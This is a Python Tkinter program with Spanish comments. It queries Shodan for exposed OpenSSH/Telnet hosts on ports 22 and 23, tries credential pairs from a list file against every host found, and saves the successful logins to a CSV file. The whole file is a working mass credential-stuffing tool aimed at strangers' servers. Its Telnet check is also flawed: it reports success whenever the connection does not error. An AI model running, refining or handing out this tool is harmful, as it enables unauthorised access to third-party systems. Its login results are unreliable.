import tkinter as tk
from tkinter import scrolledtext, messagebox
import shodan
import paramiko
import telnetlib3
import csv
import asyncio
import threading

# Variable para almacenar la clave API de Shodan
SHODAN_API_KEY = ""

# Cargar credenciales desde archivo externo
def cargar_credenciales(archivo):
    credenciales = []
    try:
        with open(archivo, 'r') as f:
            for linea in f:
                partes = linea.strip().split()
                if len(partes) == 2:
                    credenciales.append((partes[0], partes[1]))
    except FileNotFoundError:
        messagebox.showerror("Error", "Archivo de credenciales no encontrado")
    return credenciales

# Función para establecer la clave API de Shodan
def establecer_api_key():
    global SHODAN_API_KEY
    clave_api = entry_api_key.get()
    if clave_api:
        SHODAN_API_KEY = clave_api
        api = shodan.Shodan(SHODAN_API_KEY)
        messagebox.showinfo("Clave API", "Clave API de Shodan configurada correctamente.")
        ventana_api.destroy()  # Cerrar ventana de API
    else:
        messagebox.showerror("Error", "Por favor ingrese una clave API válida.")

# Función para escanear servicios expuestos
def escanear_servicios():
    if not SHODAN_API_KEY:
        messagebox.showerror("Error", "La clave API de Shodan no ha sido configurada.")
        return

    ips_auditadas = []
    credenciales = cargar_credenciales("lista_credenciales.txt")
    
    try:
        api = shodan.Shodan(SHODAN_API_KEY)
        
        # Mensaje inicial: Iniciando escaneo
        actualizar_resultados("Iniciando escaneo en Shodan...")

        # Query modificado para buscar puertos SSH (22) y Telnet (23) de forma correcta
        query_ssh_telnet = "product:OpenSSH port:22,23"  # Especificamos OpenSSH para SSH y puertos 22, 23
        resultados = api.search(query_ssh_telnet)
        
        # Mostrar la cantidad de servidores encontrados
        cantidad_servicios = len(resultados['matches'])
        actualizar_resultados(f"{cantidad_servicios} servidores encontrados.")

        for servicio in resultados['matches']:
            ip = servicio['ip_str']
            for usuario, clave in credenciales:
                ssh_resultado = probar_ssh(ip, usuario, clave)
                telnet_resultado = asyncio.run(probar_telnet(ip, usuario, clave))
                
                if ssh_resultado:
                    ips_auditadas.append((ip, usuario, clave, "SSH", "Login exitoso"))
                    actualizar_resultados(f"IP: {ip} | SSH Login exitoso | Usuario: {usuario} | Contraseña: {clave}")
                else:
                    actualizar_resultados(f"IP: {ip} | SSH Login denegado | Usuario: {usuario} | Contraseña: {clave}")
                
                if telnet_resultado:
                    ips_auditadas.append((ip, usuario, clave, "Telnet", "Login exitoso"))
                    actualizar_resultados(f"IP: {ip} | Telnet Login exitoso | Usuario: {usuario} | Contraseña: {clave}")
                else:
                    actualizar_resultados(f"IP: {ip} | Telnet Login denegado | Usuario: {usuario} | Contraseña: {clave}")
        
        mostrar_resultados(ips_auditadas)
        guardar_csv(ips_auditadas)
    except shodan.APIError as e:
        messagebox.showerror("Error", f"Error en Shodan: {e}")

# Probar conexión SSH
def probar_ssh(ip, usuario, clave):
    try:
        cliente = paramiko.SSHClient()
        cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        cliente.connect(ip, username=usuario, password=clave, timeout=5)
        cliente.close()
        return True
    except Exception:
        return False

# Probar conexión Telnet (usando telnetlib3 de manera asíncrona)
async def probar_telnet(ip, usuario, clave):
    try:
        async with telnetlib3.Telnet(ip, timeout=5) as tn:
            await tn.read_until(b"login:")
            await tn.write(usuario.encode('ascii') + b"\n")
            await tn.read_until(b"Password:")
            await tn.write(clave.encode('ascii') + b"\n")
            await tn.close()
        return True
    except Exception:
        return False

# Guardar resultados en CSV
def guardar_csv(ips):
    with open("resultados_exitosos.csv", "w", newline='') as f:
        writer = csv.writer(f)
        writer.writerow(["IP", "Usuario", "Contraseña", "Protocolo", "Estado"])
        writer.writerows(ips)

# Mostrar resultados en la interfaz gráfica
def mostrar_resultados(ips):
    txt_resultados.delete('1.0', tk.END)
    for ip, usuario, clave, protocolo, estado in ips:
        txt_resultados.insert(tk.END, f"IP: {ip} | {protocolo} | {estado} | Usuario: {usuario} | Contraseña: {clave}\n")

# Función para actualizar los resultados en la interfaz gráfica
def actualizar_resultados(texto):
    txt_resultados.insert(tk.END, f"{texto}\n")
    txt_resultados.yview(tk.END)

# Configuración de la interfaz gráfica
root = tk.Tk()
root.title("Escaneo SSH y Telnet")
root.geometry("600x400")

# Ventana para ingresar la clave API
def ventana_ingresar_api():
    global ventana_api, entry_api_key
    ventana_api = tk.Toplevel(root)
    ventana_api.title("Ingreso de Clave API")
    ventana_api.geometry("300x150")
    
    label_api = tk.Label(ventana_api, text="Ingrese su Clave API de Shodan:")
    label_api.pack(pady=10)
    
    entry_api_key = tk.Entry(ventana_api, width=30)
    entry_api_key.pack(pady=5)
    
    btn_guardar_api = tk.Button(ventana_api, text="Guardar Clave API", command=establecer_api_key)
    btn_guardar_api.pack(pady=10)

# Botón para iniciar escaneo
def iniciar_escaneo():
    if not SHODAN_API_KEY:
        ventana_ingresar_api()  # Si la clave no está configurada, pedirla
    else:
        threading.Thread(target=escanear_servicios).start()

# Título y botón de escaneo
label_titulo = tk.Label(root, text="Escaneo SSH y Telnet", font=("Arial", 14, "bold"))
label_titulo.pack(pady=10)

btn_escaneo = tk.Button(root, text="Iniciar Escaneo", command=iniciar_escaneo)
btn_escaneo.pack(pady=10)

txt_resultados = scrolledtext.ScrolledText(root, width=70, height=20)
txt_resultados.pack(pady=10)

root.mainloop()
